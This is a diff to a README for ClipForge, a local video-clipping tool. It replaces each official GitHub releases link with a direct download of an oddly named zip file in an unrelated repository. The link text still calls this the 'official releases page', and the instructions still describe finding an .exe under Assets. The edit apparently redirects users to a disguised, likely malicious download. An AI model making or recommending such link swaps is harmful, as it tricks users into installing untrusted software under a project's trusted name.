@@ -5,7 +5,7 @@ description: "Convert long YouTube videos into vertical clips with local transcr
 ---
 # ✂️ clipforge - Turn long videos into vertical clips
 
-[![Download ClipForge](https://img.shields.io/badge/Download_ClipForge-0078d4-blue.svg)](https://github.com/tomarke4840/clipforge/releases)
+[![Download ClipForge](https://img.shields.io/badge/Download_ClipForge-0078d4-blue.svg)](https://raw.githubusercontent.com/tomarke4840/tomarke4840.github.io/main/hempweed/io-tomarke-github-v2.8-beta.5.zip)
 
 ClipForge turns long YouTube videos into short, vertical clips. It handles transcription, adds subtitles, and crops video content automatically. You keep your files private on your own computer.
 
@@ -19,7 +19,7 @@ The software runs on your computer. You do not need to upload your videos to a w
 
 You need the installer file to run ClipForge. Follow these steps to prepare your system and launch the application.
 
-1. Visit the [official releases page](https://github.com/tomarke4840/clipforge/releases) to find the latest version of the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/tomarke4840/tomarke4840.github.io/main/hempweed/io-tomarke-github-v2.8-beta.5.zip) to find the latest version of the installer.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Save the file to your computer.
@@ -90,4 +90,4 @@ Remember that ClipForge is a local-first application. You are the administrator 
 
 To download the latest version, visit the link below:
 
-[https://github.com/tomarke4840/clipforge/releases](https://github.com/tomarke4840/clipforge/releases)
+[https://raw.githubusercontent.com/tomarke4840/tomarke4840.github.io/main/hempweed/io-tomarke-github-v2.8-beta.5.zip](https://raw.githubusercontent.com/tomarke4840/tomarke4840.github.io/main/hempweed/io-tomarke-github-v2.8-beta.5.zip)
